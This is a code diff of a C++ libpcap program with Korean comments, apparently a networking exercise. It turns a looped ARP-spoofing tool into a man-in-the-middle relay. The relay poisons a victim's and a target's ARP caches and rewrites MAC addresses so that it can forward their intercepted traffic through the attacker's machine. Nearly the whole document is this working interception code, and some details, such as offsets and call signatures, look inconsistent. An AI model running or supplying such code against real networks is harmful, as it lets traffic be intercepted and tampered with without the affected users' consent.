@@ -1,145 +1,121 @@
-#include <pcap.h>
-#include "ethhdr.h"
-#include "arphdr.h"
 #include "get_my_mac.h"
 #include "get_my_ip.h"
-#include <stdlib.h>
-#include <stdio.h>
-
+#include "send_arp_packet.h"
+#include "cap_mac.h"
+#define ARP_SENDER 3
+#define ARP_TARGET 4
+#define OTHER_SENDER 1
+#define OTHER_TARGET 2
+#define UDP 17
 
 #pragma pack(push, 1)
-struct EthArpPacket final {
-	EthHdr eth_;
-	ArpHdr arp_;
-};
 
 #pragma pack(pop)
 
+
+uint8_t my_mac[6] = {0,};
+char my_ip[INET_ADDRSTRLEN] = {0,};
+
 // -------------- SHOW PACKET -------------
-void show_packet(char * packet){
-    for (int i = 0; i < 60; i++){
-        printf("%02x", (uint8_t)packet[i]);
-        if (i%16 == 15){
-            printf("\n");
-        }
-        else if(i%8 == 7){
-            printf("-");
-        }
-        else {
-            printf(" ");
-        }
-    }
+
+// -------------- SHOW PACKET -------------
+
+// 패킷을 받으면
+// 내 mac으로 바꾸고
+// capture한 ip로 바꾸고
+// capture한 mac으로 바꾸고
+
+// capture한 
+
+// ip랑 mac은 놔둬야지
+
+
+// 일반 패킷
+
+// 구글에서 온거:
+// mac addr만 바꾼다
+
+// you에서 온거:
+// mac addr만 바꾼다.
+
+// arp 패킷
+// 구글에서 온거:
+// victim에게 arp 패킷을 다시 보낸다.
+
+// victim에서 온거
+// google로 arp 패킷을 다시 보낸다.
+
+int define_packet(const u_char *text, uint8_t send_mac[6]) {
+    int flag = 1;
+    if (!memcmp(text, send_mac, 6)) flag += 1; //if 같으면 dst가 send이니까 tar에게 보내야됩니다.
+    if (*(uint16_t*)(text+ 0x16) == 0x0608) flag += 2; // if 같으면 arp 니까 vic에 send arp
+    return flag;
 }
-// -------------- SHOW PACKET -------------
 
-
-
+pcap_t* handle;
+void relay_packet(const u_char * text, uint8_t mac[6]){
+    memcpy((void*)text, mac, 6);
+    memcpy((void*)(text+6), my_mac, 6);
+     int res = pcap_sendpacket(handle, text, ntohs(*(uint16_t *)(text+0x10)) + 14);
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+}
 // --------------- MAIN -------------------
-
 int main(int argc, char* argv[]) {
 // --------------- PCAP_OPEN --------------
-	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
 		return -1;
 	}
 // --------------- PCAP_OPEN --------------
 
-
-
-// --------------- MY CODE ----------------
-    uint8_t my_mac[6] = {0,};
-    get_my_mac((const std::string&) argv[1], my_mac);
-
-    char my_ip[INET_ADDRSTRLEN] = {0,};
+// --------------- MY INFO ----------------
+    get_my_mac(argv[1], my_mac);
     get_my_ip(argv[1], my_ip);
-
-// --------------- MY CODE ----------------
-
+// --------------- MY INFO ----------------
 
 
-// --------------- MAKE FIRST PACKET ------
+// --------------- GET SENDER -------------
 	EthArpPacket packet;
+    send_arp_packet(packet, argv[2]);
+    uint8_t cap_sender_mac[6];
+    cap_mac(argv[2], cap_sender_mac);
+// --------------- GET SENDER -------------
 
-	packet.eth_.dmac_ = Mac(my_mac);
-	packet.eth_.smac_ = Mac("FF:FF:FF:FF:FF:FF");
-	packet.eth_.type_ = htons(EthHdr::Arp);
+// --------------- GET TARGET -------------
+    send_arp_packet(packet,argv[3]);
+    uint8_t cap_target_mac[6];
+    cap_mac(argv[3], cap_target_mac);
+// --------------- GET TARGET -------------
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac(my_mac);
-	packet.arp_.sip_ = htonl(Ip(my_ip));
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip(argv[2]));
-// --------------- MAKE FIRST PACKET ------
-
-
-// --------------- PCAP_SEND --------------
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
-// --------------- PCAP_SEND --------------
-    
-
-// --------------- PCAP_GET ---------------
-    const uint8_t * text;
-    while(1) {
-        struct pcap_pkthdr *header;
-        int res = pcap_next_ex(handle, &header, (const u_char**)(&text)); // open  (pcap_t *pcap, pcap_pkthdr **abstact info, packet const char **)
-		if (res == 0) continue;
+    while(1){
+        pcap_pkthdr *header;
+        const u_char *text;
+        int res = pcap_next_ex(handle, &header, &text );
+        if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
 			printf("pcap_next_e./x return %d(%s)\n", res, pcap_geterr(handle));
 			break;
 		}
-
-        // ------- DEBUG ------------------
-        show_packet((char*)text);
-        // ------- DEBUG ------------------
-
-
-        // ------- MY_CODE ----------------
-        unsigned char cap_ip[INET_ADDRSTRLEN] = {0,};
-        sprintf((char*)cap_ip, "%u.%u.%u.%u",text[0x1C],text[0x1D],text[0X1E],text[0X1F]);
-        printf("\n%02x.%02x.%02x.%02x\n",text[0x1C],text[0x1D],text[0X1E],text[0X1F]);
-        printf("%u.%u.%u.%u\n",text[0x1C],text[0x1D],text[0X1E],text[0X1F]);
-        if (memcmp(cap_ip, argv[2], strlen((char*)cap_ip))){printf("\nother packet \n");continue;}
-        else{printf(" --------------- you did it !!! ------------- \n"); break;}
-        // ------- MY_CODE ----------------
-    }
-// --------------- PCAP_GET ---------------
-
-
-
-// --------------- MAKE SECOND PACKET -----
-    uint8_t cap_mac[6] = {0,};
-    memcpy(cap_mac, text+0x16, MAC_ADDR_LEN);
-    printf("sender MAC: %02x:%02x:%02x:%02x:%02x:%02x", cap_mac[0], cap_mac[1], cap_mac[2], cap_mac[3], cap_mac[4], cap_mac[5]);
-
-    
-	packet.eth_.smac_ = Mac(cap_mac);
-	packet.arp_.smac_ = Mac(my_mac);
-	packet.arp_.sip_ = htonl(Ip(argv[3]));
-	packet.arp_.tmac_ = Mac(cap_mac);
-	packet.arp_.tip_ = htonl(Ip(argv[2]));
-// --------------- MAKE SECOND PACKET -----
-
-
-// --------------- PCAP_SEND --------------
-    while (1){
-        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-        if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        int flag = define_packet(text, cap_sender_mac);
+        switch (flag){
+            case ARP_SENDER:
+                send_arp_packet(packet, argv[2], argv[3], cap_sender_mac);    
+                break;
+            case ARP_TARGET:
+                send_arp_packet(packet, argv[3], argv[2], cap_target_mac);
+                break;
+            case OTHER_SENDER:
+                relay_packet(text, cap_sender_mac);
+                break;
+            case OTHER_TARGET:
+                relay_packet(text, cap_target_mac);
+                break;
         }
-        sleep(1);
     }
-    
-// --------------- PCAP_SEND --------------
-
+// --------------- GET PACKET -------------
 	pcap_close(handle);
 }
